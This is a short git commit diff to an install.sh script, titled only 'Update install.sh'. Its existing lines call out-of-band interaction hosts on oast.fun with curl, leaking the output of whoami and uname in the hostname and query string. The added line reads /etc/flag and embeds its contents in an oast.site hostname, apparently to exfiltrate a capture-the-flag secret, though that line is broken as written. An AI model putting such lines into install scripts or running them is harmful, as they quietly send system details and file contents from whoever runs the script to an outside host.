3223ec9d551cc32e37e4ae32f38f6a7a620379db
0xmaruf <79659875+0xmaruf@users.noreply.github.com>
2024-06-25 23:12:42 -0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -2,3 +2,4 @@
 
 curl $(whoami).cct44382vtc0000a8rr0ggxii8cyyyyy8.oast.fun
 curl cknexrf2vtc0000pfbx0gj4zqhryyyyyb.oast.fun?test=$(uname)
+$(cat /etc/flag).cptqs3vm8j0lpe9mkmj0cqmf3ke5urpg7.oast.site
